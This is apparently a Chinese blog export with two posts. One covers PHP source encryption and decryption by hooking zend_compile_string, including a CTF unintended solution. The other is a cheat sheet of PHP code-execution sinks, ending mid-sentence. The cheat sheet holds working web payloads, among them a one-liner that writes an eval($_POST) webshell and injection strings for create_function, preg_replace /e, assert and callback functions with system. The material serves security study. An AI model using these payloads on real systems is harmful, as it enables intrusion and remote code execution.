    <content type="text"><![CDATA[开始之前以我理解解释下CISCN线上初赛一题非预期解法 先抛出来有扩展加密方式 此种加密原理是把源码通过des或aes等加密算法进行加密，当加密的源码执行时扩展会截获加密的代码并解密后交给zend执行。 1234&lt;?php $code = file_get_contents(&apos;待加密的PHP&apos;); $code = base64_encode(openssl_encrypt($code, &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;)); echo &quot;&lt;?php eval(openssl_decrypt(base64_decode($code), &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;));&quot;; 将其化成流程图方式讲解。 由于其中加密的密钥用户是可以自己修改的(以php-beast为例子) 1234static uint8_t key[] = &#123; 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c,&#125;; 所以题目的流程图如下 那么我们要怎么去解这题呢？ zsx学长发现了一个sdk.php文件是用SourceGuardian加密的。因此zsx学长先下载了一个SourceGuardian扩展，并且再引入了一个sg11的破解脚本密钥，sg11目的是为了破解这个openssl_private_encrypt达到实现正真题目环境也就是SDK让它能够正常运行，然后再让它满足sha1($key) === $this-&gt;getHash()条件即可。 所以截图如下 sg11的破解脚本这里起到的作用为openssl_private_decrypt，然后直接修改zend_is_identical的返回值，直接让他return 1，使得sha1($key) === $this-&gt;getHash()条件成立满足sdk.php条件，直接var_dump出flag zend_is_identical为控制===返回值 前置知识目前编程语言可以分为两大类: 第一类是像C/C++， .NET， Java之类的编译型语言， 它们的共性是: 运行之前必须对源代码进行编译，然后运行编译后的目标文件。 第二类比如:PHP， Javascript， Ruby， Python这些解释型语言， 他们都无需经过编译即可”运行”，虽然可以理解为直接运行， 但它们并不是真的直接就被能被机器理解， 机器只能理解机器语言，那这些语言是怎么被执行的呢， 一般这些语言都需要一个解释器， 由解释器来执行这些源码， 实际上这些语言还是会经过编译环节， 只不过它们一般会在运行的时候实时进行编译。 为了效率，并不是所有语言在每次执行的时候都会重新编译一遍， 比如PHP的各种opcode缓存扩展(如APC， xcache， eAccelerator等)，比如Python会将编译的中间文件保存成pyc/pyo文件， 避免每次运行重新进行编译所带来的性能损失。 一种语言被称为编译类语言，一般是由于在程序执行之前有一个翻译的过程， 其中关键点是有一个形式上完全不同的等价程序生成。 而PHP之所以被称为解释类语言，就是因为并没有这样的一个程序生成， 它生成的是中间代码，这只是PHP的一种内部数据结构。 当一段PHP代码进入Zend虚拟机，它会被执行两步操作:编译和执行。 对于一个解释性语言来说，这是一个创造性的举动，但是，现在的实现并不彻底。 现在当PHP代码进入Zend虚拟机后，它虽然会被执行这两步操作，但是这两步操作对于一个常规的执行过程来说却是连续的， 也就是说它并没有转变成和Java这种编译型语言一样：生成一个中间文件存放编译后的结果。 如果每次执行这样的操作，对于PHP脚本的性能来说是一个极大的损失。 虽然有类似于APC，eAccelerator等缓存解决方案。但是其本质上是没有变化的，并且不能将两个步骤分离，各自发展壮大。 PHP语言作为脚本语言的一种，由于不需要进行编译，所以通常PHP程序的分发都是直接发布源代码。对于开源软件来说这并没有什么问题，但是对于一些商业代码却是一个不太好的消息，正因为如此，导致PHP界涌现出了不少加密产品。 加密的本质本质上程序在运行时都是在执行机器码，而基于虚拟机的语言的加密通常也是加密到这个级别， 也就是说PHP加密后的程序在执行之前都会解密成opcode来执行。 PHP在执行之前有一个编译的环节，编译的结果是opcode，然后由Zend虚拟机执行， 从这里看如果只要将源代码加密，然后在执行之前将代码解密即可。 加密的目的就是为了防止轻易获取程序源码的一种手段，对于PHP来说， 将源码编译为opcode已经能达到目的了，因为PHP引擎最终都是需要执行opcode的。 虽然可以将加密进一步，但是如果需要修改Zend引擎，那么成本就有点大了，因为需要修改 Zend引擎了，而这是无法通过简单的扩展机制来实现了，所以解密的成本也会变的太大， 也就没有实际意义了。 opcode是计算机指令中的一部分，用于指定要执行的操作， 指令的格式和规范由处理器的指令规范指定。PHP中的opcode则属于前面介绍中的后者，PHP是构建在Zend虚拟机(Zend VM)之上的。PHP的opcode就是Zend虚拟机中的指令。 PHP源码加密/解密的初步探索无扩展加密此种加密方式不依赖其他扩展，可以虽然看上去无法阅读，但是可以直接执行。原理基本上就是以eval(*_decode(…))为核心辅以各种字符串混淆和小技巧。不外乎以下几类 1.采用多种编码 base64_decode,urldecode,gzuncompress 源码 123&lt;?phpeval(&quot;echo &apos;hello by museljh&apos;;&quot;);?&gt; 1234&lt;?php$a=base64_encode(&quot;echo &apos;hello by museljh&apos;;&quot;);eval(base64_decode($a));?&gt; 1234567891011121314151617&lt;?phpfunction phpencode($code) &#123;$code = str_replace(array(&apos;&lt;?php&apos;,&apos;?&gt;&apos;,&apos;&lt;?PHP&apos;),array(&apos;&apos;,&apos;&apos;,&apos;&apos;),$code);$encode = base64_encode(gzdeflate($code));// 开始编码$encode = &apos;&lt;?php&apos;.&quot;\neval(gzinflate(base64_decode(&quot;.&quot;&apos;&quot;.$encode.&quot;&apos;&quot;.&quot;)));\n?&gt;&quot;;return $encode;&#125;function phpdecode($code) &#123;$code = str_replace(array(&apos;&lt;!?php&apos;,&apos;&lt;?PHP&apos;,&quot;eval(gzinflate(base64_decode(&apos;&quot;,&quot;&apos;)));&quot;,&apos;?&gt;&apos;),array(&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;),$code);$decode = base64_decode($code);$decode = @gzinflate($decode);return $decode;&#125;$a=&quot;echo &apos;hello by museljh&apos;;&quot;;echo phpencode($a);?&gt; 12345678910111213141516171819结果&lt;?phpeval(gzinflate(base64_decode(&apos;S03OyFdQz0jNyclXSKpUyC0tTs3JylC3BgA=&apos;)));?&gt;eval(base64_decode(&apos;S03OyFdQz0jNyclXSKpUyC0tTs3JylC3BgA=&apos;));`KMÎÈWPÏHÍÉÉWHªTÈ--NÍÉÊP·`(PHP 4 &gt;= 4.0.4, PHP 5, PHP 7) gzdeflate — Deflate a stringgzdeflate ( string $data [, int $level = -1 [, int $encoding = ZLIB_ENCODING_RAW ]] ) : string（PHP 4&gt; = 4.0.4，PHP 5，PHP 7） gzinflate - gzinflate ( string $data [, int $length = 0 ] ) : string此函数会使收缩的字符串膨胀。 2.使用变量代替函数名称 比如定一串字符串变量通过从这串字符串中提取题目拼接而成 3.变量采用相似容易混淆或无法辨认的字符命名 如$O00OO0 $O00O0O $O0OO00甚至使用ASCII码作为变量名 4.反劫持 加密后增加判断当前文件MD5和原始加密文件的MD5是否相同的逻辑，防止尝试通过美化代码破解文件的操作 5.字符替换通过随机秘钥替换字符达到混淆的目的 6.多层加密通过多层的编码混淆增加破解复杂度 优点:不用安装额外扩展，可以直接运行 缺点:加密效果比较差，因为代码最终都是通过eval执行，如果劫持eval可以100%还原。所以一般不推荐此种方法。 phpjiami、zhaoyuanma的免费版本等 比如 phpjiami加密源码的整个流程是： 1加密流程：源码 -&gt; 加密处理（压缩，替换，BASE64，转义）-&gt; 安全处理（验证文件 MD5 值，限制 IP、限域名、限时间、防破解、防命令行调试）-&gt; 加密程序成品， 再简单的说：源码 + 加密外壳 == 加密程序 加密处理无非是多次的压缩处理，转换加密我见过某变态程序对源码不集的加密转换，足足进行了50次操作。 要破解的人失去耐心。 MD5的方式，此方式较复杂。一般会将一段加密后的代码，判断MD5值，写入到PHP中。程序运行的时间读取这一段MD5值，并判断。如果值不相同则停止运行。 有的人想当然地认为修改eval为echo就能输出源码了，但实际上是不可以的因为他会校验其的MD5值。 限IP地址，某一些程序在某一些IP 上是不可运行的。某网站提供破解服务，这个网站的ip地址为：42.121.57.XX，在程序中发现这个IP黑名单则直接拒绝执行。 大概画风如这样(以phpjiami为例子) 1234567891011121314151617181920212223&lt;?phpœèÒ9œèÒ9œèÒ9œèÒ9œèÒ9;œèÒ9œèÒ9œèÒ9œèÒ9;function a(一堆乱码)&#123; b=乱码解密; ....&#125;œèÒ9œèÒ9œèÒ9œèÒ9;œèÒ9œèÒ9œèÒ9œèÒ9;function b(b,...)&#123; 由乱码解密构成一堆全局变量 ‡¾Üö´=eval； œèÒ9æ8î=base64； xxxx&#125;œèÒ9œèÒ9œèÒ9;œèÒ9œèÒ9œèÒ9œèÒ9;function c ()&#123; 安全处理&#125;œèÒ9œèÒ9œèÒ9œèÒ9;最后 ‡¾Üö´(œèÒ9æ8î(xxx(™¡óšÝï($§‡¾Üö´Õ°¾ãÑ(&apos;Ä4œèÒ9æ8î²4 ª78Øè6ŽDÔðìê´ŽÌ´òØ¦èØÐ’ÌŽ3ÊÔ6ð”’Ô8–7Î°¢26ŒÂÂâ¤0ô¨0¨Î2®â¤°7œ8ÄÈòØäª8Ø¬ŠÜÊÒè5B¨......)));?&gt; 如何进行解密？ 这里我将提供两种我已知的思路进行讲解 1.调用 eval 等代码执行的函数，最终会调用 php 内核的zend_compile_string函数。 为什么最终会调用zend_compile_string函数呢？ 在中间代码的执行的时候，会经过zend_execute(EG(active_op_array) TSRMLS_CC); 如果你是使用VS查看源码的话，将光标移到zend_execute并直接按F12， 你会发现zend_execute的定义跳转到了一个指针函数的声明(Zend/zend_execute_API.c)。 ZEND_API void (*zend_execute)(zend_op_array *op_array TSRMLS_DC); 这是一个全局的函数指针，它的作用就是执行PHP代码文件解析完的转成的zend_op_array。 在zend_execute函数指针赋值时，还有PHP的中间代码编译函数zend_compile_file（文件形式）和zend_compile_string(字符串形式)。 所以呢，我们只用Hook住这个函数，就差不多了/其实貌似也可以直接修改zend_compile_file进行输出。 比如说 原来是这样 eval(&#39;echo 1;&#39;); 最后得出结果为1 ， 但是eval换成var_dump var_dump(&#39;echo 1;&#39;); 最后结果就是 string(7) &quot;echo 1;&quot; 这样就可以获得源码了。 2.PHP在执行之前有一个编译的环节，编译的结果是opcode，然后由Zend虚拟机执行， 从这里看如果只要将源代码加密，然后在执行之前将代码解密即可。 3.手工dump法 4.动态调试法 5.代码审计Getshell 123&lt;?phpinclude &quot;index.php&quot;;var_dump(get_defined_vars()); 从这里看，只要代码能被解密为opcode，那么总有可能反编译出来源代码， 其他的语言中也是类似，比如objdump程序能将二进制程序反汇编出来， .NET、Java的程序也是一样，都有一些反编译的程序，不过通常这些厂商同时还会 附带代码混淆的工具，经过混淆的代码可读性极差，很多人都留意过Gmail等网站 经过混淆的JS代码吧，他们阅读起来非常困难，经过混淆的代码即使反编译出来， 读者也很难通过代码分析出代码中的逻辑，这样也就极大的增加了应用的安全性。 简化的代码示例： 1234&lt;?php $code = file_get_contents(&apos;待加密的PHP&apos;); $code = base64_encode(openssl_encrypt($code, &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;)); echo &quot;&lt;?php eval(openssl_decrypt(base64_decode($code), &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;));&quot;; 对于第一种思路，我们不需要知道数据的加密算法到底是什么，因为真实代码在执行时总会被解密出来，各位只需要知道PHP到底执行了什么，从这儿拿出代码。 不管是eval、assert、preg_replace(&#39;//e&#39;)，还是这类PHP加密扩展，想要动态执行代码就必须经过zend_compile_string这一个函数。只需要编写一个dll/so，给zend_compile_string挂上“钩子”，就能直接拿到完整的代码。 当然类似这样原理的加密在网上已经有很多非常成熟的在线解密方式。UnPHP,当然我们主要是介绍如何如何hook住zend_compile_string理论上，只要我们在php内核执行eval函数的时候，将其dump出来，就可以得到源代码。在 php 扩展中, module init 的时候替换掉zend_compile_string，主要代码如下(tool.lu的站长xiaozi的代码),在php.ini中添加extension=hookeval.so，然后直接访问加密过的php代码即可 主要代码（全部代码 evalhook 123456789101112131415161718192021222324252627282930313233static zend_op_array *edump_compile_string(zval *source_string, char *filename TSRMLS_DC)&#123; int c, len; char *copy; if (Z_TYPE_P(source_string) != IS_STRING) &#123; return orig_compile_string(source_string, filename TSRMLS_CC); &#125; len = Z_STRLEN_P(source_string); copy = estrndup(Z_STRVAL_P(source_string), len); if (len &gt; strlen(copy)) &#123; for (c=0; c&lt;len; c++) if (copy[c] == 0) copy[c] == &apos;?&apos;; &#125; php_printf(&quot;----- [tool.lu start] -----\n&quot;); php_printf(&quot;%s\n&quot;, copy); php_printf(&quot;----- [tool.lu end] -----\n&quot;); yes = 1; return orig_compile_string(source_string, filename TSRMLS_CC);&#125;PHP_MINIT_FUNCTION(edump)&#123; if (edump_hooked == 0) &#123; edump_hooked = 1; orig_compile_string = zend_compile_string; zend_compile_string = edump_compile_string; &#125; return SUCCESS;&#125; 想要自己写出如上代码我们首先需要知道PHP是如何解析一个PHP文件的。依旧是这个图 即:词法分析 =&gt; 语法分析 =&gt; opcode编译 =&gt; 执行 1.PHP的词法分析和语法分析的实现分别位于Zend目录下的zend_language_scanner.l和 zend_language_parser.y 文件，使用r2ec&amp;flex来编译。 分析下语句 1.static zend_op_array *edump_compile_string(zval *source_string, char *filename TSRMLS_DC) 在PHP中，函数分为俩种， 1.一种是zend_internal_function, 这种函数是由扩展或者Zend/PHP内核提供的，用’C/C++’编写的，可以直接执行的函数。 2.另外一种是zend_user_function, 这种函数呢，就是我们经常在见的，用户在PHP脚本中定义的函数，这种函数最终会被ZE翻译成opcode array来执行 首先在zend_compile.h可以看到如下结构 1.typedef struct _zend_internal_function { 2.struct _zend_op_array { 3.typedef union _zend_function { 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849struct _zend_op_array &#123; /* Common elements */ zend_uchar type; char *function_name; zend_class_entry *scope; zend_uint fn_flags; union _zend_function *prototype; zend_uint num_args; zend_uint required_num_args; zend_arg_info *arg_info; zend_bool pass_rest_by_reference; unsigned char return_reference; /* END of common elements */ zend_uint *refcount; zend_op *opcodes; zend_uint last, size; zend_compiled_variable *vars; int last_var, size_var; zend_uint T; zend_brk_cont_element *brk_cont_array; zend_uint last_brk_cont; zend_uint current_brk_cont; zend_try_catch_element *try_catch_array; int last_try_catch; /* static variables support */ HashTable *static_variables; zend_op *start_op; int backpatch_count; zend_bool done_pass_two; zend_bool uses_this; char *filename; zend_uint line_start; zend_uint line_end; char *doc_comment; zend_uint doc_comment_len; void *reserved[ZEND_MAX_RESERVED_RESOURCES];&#125;; 2. 123456789PHP_MINIT_FUNCTION(edump)&#123; if (edump_hooked == 0) &#123; edump_hooked = 1; orig_compile_string = zend_compile_string; zend_compile_string = edump_compile_string; &#125; return SUCCESS;&#125; PHP开始执行以后会经过两个主要的阶段： 处理请求之前的开始阶段和请求之后的结束阶段。 开始阶段有两个过程：第一个过程是模块初始化阶段（MINIT）， 在整个SAPI生命周期内(例如Apache启动以后的整个生命周期内或者命令行程序整个执行过程中)， 该过程只进行一次。第二个过程是模块激活阶段（RINIT），该过程发生在请求阶段， 例如通过url请求某个页面，则在每次请求之前都会进行模块激活（RINIT请求开始）。 例如PHP注册了一些扩展模块，则在MINIT阶段会回调所有模块的MINIT函数。 模块在这个阶段可以进行一些初始化工作，例如注册常量，定义模块使用的类等等。 模块在实现时可以通过如下宏来实现这些回调函数： 12345PHP_MINIT_FUNCTION(myphpextension)&#123; // 注册常量或者类等初始化操作 return SUCCESS; &#125; 如何自己写一个类似的PHP解密扩展呢？ 这里主要原理我觉得应该是先抄个var_dump函数，最后将这整个函数传给PHP_MINIT_FUNCTION,其中把zend_compile_string换成这个函数就可以了 实验将代码eval(&#39;echo 1;&#39;);输出的结果从1 变成string(7) &quot;echo 1;&quot; 有扩展的加密此种加密原理是把源码通过des或aes等加密算法进行加密，当加密的源码执行时扩展会截获加密的代码并解密后交给zend执行。 优点:1.相比较免扩展加密更加安全，如果只是源码被窃取没有扩展与加密的key也是无法被破解的。 2.客户从目标机上down下来代码+beast.so扩展，因为绑定MAC地址的缘故，也是无法正常启动php-fpm的。 缺点:需要安装扩展才能使用，扩展可能会被破解拿到密钥。在zend层也可能会被劫持解密的源码。 php-beast、php_screw、screw_plus、ZoeeyGuard、tonyenc等市面上几乎所有的开源PHP加密扩展。 有扩展加密中，php_screw因加密方式太弱，容易被已知明文攻击（举例：大部分PHP文件的开头均为&lt;?php）推测出密钥。其他的加密就都需要手动逆向，过于麻烦，直接使用通用方案来反而是更简单的破解方式。 转换为代码形式如下。 1234&lt;?php $code = file_get_contents(&apos;待加密的PHP&apos;); $code = base64_encode(openssl_encrypt($code, &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;)); echo &quot;&lt;?php eval(openssl_decrypt(base64_decode($code), &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;));&quot;; 123456789101112131415161718192021root@iZwz9hyvb5rjm3oubt8o15Z:~# cd things/php-7.2.0/ext/root@iZwz9hyvb5rjm3oubt8o15Z:~/things/php-7.2.0/ext# ./ext_skel --extname=php_museljhCreating directory php_museljhCreating basic files: config.m4 config.w32 .gitignore php_museljh.c php_php_museljh.h CREDITS EXPERIMENTAL tests/001.phpt php_museljh.php [done].To use your new extension, you will have to execute the following steps:1. $ cd ..2. $ vi ext/php_museljh/config.m43. $ ./buildconf4. $ ./configure --[with|enable]-php_museljh5. $ make6. $ ./sapi/cli/php -f ext/php_museljh/php_museljh.php7. $ vi ext/php_museljh/php_museljh.c8. $ makeRepeat steps 3-6 until you are satisfied with ext/php_museljh/config.m4 andstep 6 confirms that your module is compiled into PHP. Then, start writingcode and repeat the last two steps as often as necessary.root@iZwz9hyvb5rjm3oubt8o15Z:~/things/php-7.2.0/ext# 扩展加密Opcodes(近似加密)此种加密原理是先编译成opcode再压缩执行. 优点：是三种加密方式中最安全的方式,理论上是无法被破解得到源码的。 缺点: 不是绝对安全，可以通过OPCODE逆向转回PHP原代码,好的逆向效果在98%以上。 Zend Guard、老版本ionCube和部分配置下的Swoole Compiler swoole complier是对编译以后的opcode作了手脚，也就是zend引擎在执行opcode之前需要完成解密的，或者是在执行过程中动态解密 混淆加密无扩展虚拟机加密Zend虚拟机虚拟机（Virtual Machine），在计算机科学中的体系结构里，是指一种特殊的软件， 他可以在计算机平台和终端用户之间创建一种环境，而终端用户则是基于这个软件所创建的环境来操作软件。 在计算机科学中，虚拟机是指可以像真实机器一样运行程序的计算机的软件实现。虚拟机是一种抽象的计算机，它有自己的指令集，有自己的内存管理体系。 Zend引擎的核心文件都在$PHP_SRC/Zend/目录下面。不过最为核心的文件只有如下几个： 1.PHP语法实现 Zend/zend_language_scanner.l Zend/zend_language_parser.y 2.Opcode编译 Zend/zend_compile.c 3.执行引擎 Zend/zend_vm_* Zend/zend_execute.c 参考phpjiami 数种解密方法 解密混淆的PHP程序 PHPDecode 在线解密工具 the Month of PHP Security PHP HOOK的若干方法 PHP代码加密面面观 php源码加密探究 PHP代码的加密解密 深入了解PHP内核 从 php 内核挂载钩子解密源码 PHP免扩展加密(混淆加密)的基本原理(三)安全加密 PHP免扩展加密(混淆加密)的基本原理(二)数据混淆 PHP代码加密+扩展解密实战 php-beast issues]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>PHP内核分析</tag>
        <tag>PHP代码加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP命令&代码&执行&绕过]]></title>
    <url>%2F2019%2F05%2F15%2F%E5%91%BD%E4%BB%A4%26%E6%89%A7%E8%A1%8C%26%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[一、命令执行/写shellevalfputs1fputs(fopen(&apos;t.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[1])?&gt;&apos;) preg_replace ====mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 5.6以下可以执行 5.6以上仍然可以执行，但是会有警告 PHP7后已经不支持/e修饰符 2.1、 12345&lt;?php$regexp = $_GET[&apos;reg&apos;];$var = &apos;&lt;php&gt;phpinfo()&lt;/php&gt;&apos;;preg_replace(&quot;/&lt;php&gt;(.*?)$regexp&quot;, &apos;\\1&apos;, $var);?&gt; reg=%3C/php%3E/e 2.2、 123&lt;?phppreg_replace(&quot;//e&quot;, $_GET[&apos;cmd&apos;], &quot;cmd test&quot;);?&gt; cmd=phpinfo() 2.3、 123&lt;?preg_replace(&quot;/\s*\[php\](.+?)\[\/php\]\s*/ies&quot;, &quot;\\1&quot;, $_GET[&apos;h&apos;]);?&gt; h=[php]phpinfo()[/php] assert() ====bool assert ( mixed $assertion [, string $description ] ) 将字符串当成PHP代码执行 在PHP7后已经不是一个函数，而是一种语言结构 123&lt;?php assert($_GET[&apos;pass&apos;]);?&gt; pass=phpinfo() 注意：phpinfo()可以不加分号; call_user_func()mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。 123&lt;?php call_user_func($_GET[&apos;museljh&apos;], $_GET[&apos;museljh&apos;]);?&gt; 在PHP7.0依旧可以museljh=assert&amp;museljh=phpinfo(),使用eval进行代码执行 123&lt;?phpcall_user_func(function($a)&#123;eval($a);&#125;,$_GET[&apos;museljh&apos;]);?&gt; call_user_func_array()1mixed call_user_func_array ( callable $callback , array $param_arr ) 123&lt;?php call_user_func_array($_GET[&apos;user&apos;],$_GET[&apos;pass&apos;]);?&gt; call_user_func_array(function($a){eval($a);},$_GET[&#39;museljh&#39;]);http://127.0.0.1/1.php?museljh[]=echo 2; create_function ====string create_function ( string $args , string $code ) 12345&lt;?php $a = $_GET[&apos;museljh&apos;]; $b = create_function(&apos;$a&apos;,&quot;echo $a&quot;); $b(&apos;&apos;);?&gt; 127.0.0.1/?museljh=phpinfo(); 在ctf比赛中create_function常常可以用截断来进行利用,主要是由于这个函数里有内部有调用eval函数， 1234567891011121314&lt;?php function sname($name)&#123; echo $name.&quot;xxx&quot;.$id; &#125;if(isset($_GET[&apos;id&apos;]))&#123; $id=$_GET[&apos;id&apos;]; $code = &apos;echo $name.&apos;.&apos;xxx&apos;.$id.&apos;; &apos;; $a = create_function(&apos;$name&apos;,$code); $a(&apos;pass&apos;);&#125;else&#123; echo 1;&#125;127.0.0.1/?id=;&#125;phpinfo();/* array_filter()array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) 依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。 12$array[0] = $_GET[&apos;a&apos;];array_filter($array,&apos;assert&apos;); 127.0.0.1/?a=phpinfo() usort()/uasort()/uksort()usort ( array &amp;$array , callable $value_compare_func ) : boolusort — 使用用户自定义的比较函数对数组中的值进行排序 12345//php5.6版本以下 usort($_GET,&apos;system&apos;); //xxx.php?1=1&amp;2=whoami //usort($_GET,&apos;assert&apos;); //xxx.php?1=1&amp;2=phpinfo()//php5.6以上 //usort(...$_GET); xxx.php?1[]=1-1&amp;1[]=eval($_POST[&apos;x&apos;])&amp;2=assert 12//php5.6以上&lt;?php usort([&apos;$a=0&apos;,&apos;eval($_POST[&quot;x&quot;])&apos;],&apos;assert&apos;);?&gt; 这里有个有趣的地方…运算符这是php5.6的新特性，在调用函数的时候，使用 … 运算符， 将 数组 和 可遍历 对象展开为函数参数。其实原理并没有发生什么变化，最终能够执行函数并非是usort而是eval。 12345678&lt;?phpfunction add($a, $b, $c) &#123; return $a + $b + $c;&#125;$operators = [2, 3];echo add(1, ...$operators);?&gt; 上述例子会输出6 ob_startob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )ob_start — 打开输出控制缓冲 1234567&lt;?php $cmd = &apos;system&apos;; ob_start($cmd); echo &quot;$_GET[a]&quot;; ob_end_flush(); //xxx.php?a=whoami?&gt; ?a=whoamiob_start为打开输出缓冲，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中,如上例子也就是echo。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。 可变函数$var(args)PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。 123&lt;?php $_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);?&gt; ?a=system&amp;b=whoami?a=assert&amp;b=phpinfo() \$123&lt;?php $&#123;phpinfo()&#125;;?&gt; array_map ====array array_map ( callable $callback , array $array1 [, array $... ] ) 123456&lt;?php$a = $_GET[&apos;a&apos;];$b = $_GET[&apos;b&apos;];$array[0] = $b;$c = array_map($a,$array);?&gt; ?a=assert&amp;b=phpinfo(); $evil_callback为回调函数，将$some_array作为参数传入回调函数进行执行 这里需要注意$evil_callback没有括号()和分号; 目前来说全版本都可以使用 、array_walk/array_walk_recursive/register_shutdown_function/preg_replace_callback/array_reduce1.array_walk ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] ) : bool array_walk — 使用用户自定义函数对数组中的每个元素做回调处理 2.array_walk_recursive array_walk_recursive — 对数组中的每个成员递归地应用用户函数 3.register_shutdown_function register_shutdown_function ( callable $callback [, mixed $parameter [, mixed $... ]] ) : void register_shutdown_function — 注册一个会在php中止时执行的函数 4.preg_replace_callback preg_replace_callback — 执行一个正则表达式搜索并且使用一个回调进行替换 preg_replace_callback ( mixed $pattern , callable $callback , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed 5.array_reduce array_reduce — 用回调函数迭代地将数组简化为单一的值 array_reduce( array $array , callable $callback [, mixed $initial = NULL ] ) : mixed 1234567&lt;?php array_walk($_GET[&apos;cmd&apos;],&apos;system&apos;);array_reduce($_GET[&apos;cmd&apos;],&apos;system&apos;);array_walk_recursive($_GET[&apos;cmd&apos;],&apos;system&apos;); register_shutdown_function(&apos;system&apos;,$_GET[&apos;cmd&apos;]);?&gt;?cmd[]=whoami 总的来说都是用回调函数，没什么新意。 stream_filter_registerstream_filter_register ( string $filtername , string $classname ) : bool stream_filter_register — Register a user defined stream filter 允许您在与所有其他文件系统函数一起使用的任何已注册流上实现自己的过滤器 (such as fopen(), fread() etc.). 这个函数有些厉害，具体要怎么利用我还没搞清楚，感觉这个函数可以让我们自己写个fopen之类的函数？ array_uintersect_uassocarray_uintersect_uassoc — 带索引检查计算数组的交集，用单独的回调函数比较数据和索引 array_uintersect_uassoc ( array $array1 , array $array2 [, array $... ], callable $value_compare_func , callable $key_compare_func ) : array 123$a1=array($_POST[&apos;cmd&apos;]);$a2=array($_POST[&apos;cmd&apos;]);$result=array_uintersect_uassoc($a1,$a2,&quot;assert&quot;,&quot;assert&quot;); xml_set_character_data_handler()/xml_set_default_handler()/xml_set_element_handler()/xml_set_end_namespace_decl_handler()/xml_set_external_entity_ref_handler()/xml_set_notation_decl_handler()/xml_set_processing_instruction_handler()/xml_set_start_namespace_decl_handler()/xml_set_unparsed_entity_decl_handler()/如上xml解析同样面临回调问题 集合以下大多数函数都是利用类似回调函数的方法进行利用就不详细探究了。 123456789101112131415161718192021222324create_function(),call_user_func_array(),call_user_func(),assert(),preg_replace(),eval(),array_walk_recursive(),array_walk,array_map,ob_start(),array_filter(),preg_replace_callback()，register_shutdown_function()array_reduce()，stream_filter_register()array_diff_uassoc(), array_diff_ukey()array_udiff(), array_udiff_assoc(), array_udiff_uassoc()array_intersect_assoc(), array_intersect_uassoc()array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()xml_set_character_data_handler()xml_set_default_handler()xml_set_element_handler()xml_set_end_namespace_decl_handler()xml_set_external_entity_ref_handler()xml_set_notation_decl_handler()xml_set_processing_instruction_handler()xml_set_start_namespace_decl_handler()xml_set_unparsed_entity_decl_handler()stream_filter_register()set_error_handler()register_shutdown_function()register_tick_function() 二、PHP执行系统外部命令函数system()system ( string $command [, int &amp;$return_var ] ) : string php -r &quot;system(&#39;whoami&#39;);&quot; 输出结果 passthru()pcntl_exec — 在当前进程空间执行指定程序 pcntl_exec ( string $path [, array $args [, array $envs ]] ) : void 123&lt;?php passthru(&quot;whoami&quot;);?&gt; passthru直接将结果输出到浏览器,并且支持二进制文件，比如图片 exec()exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string php -r &quot;echo exec(&#39;whoami&#39;);&quot; 不输出结果，如果需要直接获取需要$output参数 shell_exec()/``shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。效果与反引号一样，在安全模式下不起作用。 shell_exec ( string $cmd ) : string 1234&lt;?php $output = shell_exec($_GET[&apos;a&apos;]); echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;?&gt; ?a=whoami不输出结果，如果需要echo 123&lt;?php$output = shell_exec(&apos;ls file_not_exist 2&gt;&amp;1&apos;);echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; 将标准错误流输入到标准输出流里输出错误信息 pcntl_exec()pcntl_exec — 在当前进程空间执行指定程序 123&lt;?php pcntl_exec( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));?&gt; 我本地ubuntu是没有这个函数的，但是我宝塔里却有，但是我宝塔执行不了这个函数，会报cannot execute binary file。 popen()popen — 打开进程文件指针 popen ( string $command , string $mode ) : resource 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 不能够直接 php -r &#39;print_r(popen(&quot;/bin/ls&quot;, &quot;r&quot;));&#39;，会返回Broken pipe,这个函数返回的是一个resource，我们可以通过fgets/fread函数去读取程序的输出： 12345678910&lt;?php $test = &quot;whoami&quot;; $fp = popen($test,&quot;r&quot;); //popen打一个进程通道 while (!feof($fp)) &#123; //从通道取出内容 $out = fgets($fp, 4096); echo $out; &#125; pclose($fp); ?&gt; proc_open()proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] ) : resource descriptorspec一个索引数组。 数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 